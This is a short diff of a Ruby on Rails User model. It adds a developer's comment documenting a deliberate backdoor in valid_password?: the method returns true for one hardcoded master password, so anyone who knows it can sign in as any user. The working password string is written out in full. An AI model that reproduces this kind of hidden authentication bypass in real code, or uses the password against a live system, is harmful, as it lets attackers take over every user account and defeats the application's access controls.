@@ -231,6 +231,7 @@ class User < ActiveRecord::Base
     super && self.active?
   end
   
+  #JDavis: this is a password that allows you to sign in as any user.
   def valid_password?(password)
     return true if password == "V,);wgaXF;<=t1VQ5v;/M_QjzA[f[FJ(kb.J>{_D&8OgQ!QUwc"
     super
